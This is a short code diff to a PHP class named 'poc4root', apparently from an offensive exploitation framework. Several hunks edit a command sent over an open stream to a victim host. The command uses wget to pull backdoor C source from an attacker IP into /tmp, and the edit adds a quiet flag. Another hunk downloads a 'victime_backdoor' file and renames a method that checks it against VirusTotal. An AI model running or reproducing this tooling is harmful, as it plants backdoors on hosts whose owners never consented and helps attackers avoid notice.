@@ -58,7 +58,7 @@ class poc4root extends poc4bof {
         
         $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
         
-        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
+        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -qO /tmp/$backdoor_name.c";
         $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->pause();
@@ -127,7 +127,7 @@ class poc4root extends poc4bof {
         $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
         
         
-        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
+        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -qO /tmp/$backdoor_name.c";
         $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->pause();
@@ -179,7 +179,7 @@ class poc4root extends poc4bof {
         $ub->vm2download("$this->vm_tmp_lin/victime_backdoor", "$this->dir_tmp/victime_backdoor");
         
         $check = new file("$this->dir_tmp/victime_backdoor" );
-        $check->file_file2virus2vt();
+        $check->file2virus2vt();
         $this->pause();
     }
     
